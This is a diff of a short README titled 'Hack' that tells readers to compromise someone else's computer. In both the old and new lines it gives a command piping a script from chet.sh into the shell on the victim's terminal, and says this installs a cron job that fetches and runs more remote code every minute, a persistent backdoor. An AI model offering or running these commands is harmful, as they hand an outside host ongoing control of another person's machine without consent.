@@ -1,6 +1,6 @@
 # Hack
 
-Start hacking someone by running this command from their Terminal: `curl https://chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl https://chet.sh/live | sh`.
+Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.
 
 Now go to your commandline and we can start having some fun.
 
